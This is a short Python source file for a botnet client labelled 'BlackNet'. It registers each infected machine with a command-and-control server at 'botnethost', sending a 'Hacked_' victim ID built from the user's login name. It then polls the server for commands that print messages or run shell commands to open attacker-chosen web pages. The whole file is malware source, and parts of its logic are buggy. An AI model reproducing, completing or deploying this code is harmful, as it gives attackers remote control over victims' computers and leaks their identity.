import requests
import os
import socket
import struct
import platform
import base64
import time

URL = "http://botnethost/blacknet/"
uid = "Hacked_" + base64.b64encode(os.getlogin());
if os.name == "posix":
      oss = "GNU/LINUX"
pass
requests.get(url = URL + "connection.php", params = {
		    'VicID': uid,
            'os': oss,
            'antivirus': "None",
            'status': "Online"
})

count = 0
while (count == 0):
   commands = requests.get(URL + "/Clients/" + uid + ".txt")
   splitcommand = commands.text.split("|BN|")
   time.sleep(20)
   if splitcommand == "":
      print "hello"
   else:
   	   if splitcommand[0] == "PrintMessage":
   	      print splitcommand[1]
   	      requests.get(url = URL + "receive.php", params = {
   	      	'command': "CleanCommands",
		    'VicID': uid
           })
   	   pass
   	   if splitcommand[0] == "OpenWebpage":
   	      os.system("firefox " + splitcommand[1])
   	      requests.get(url = URL + "receive.php", params = {
   	      	'command': "CleanCommands",
		    'VicID': uid
           })
   	   pass
pass


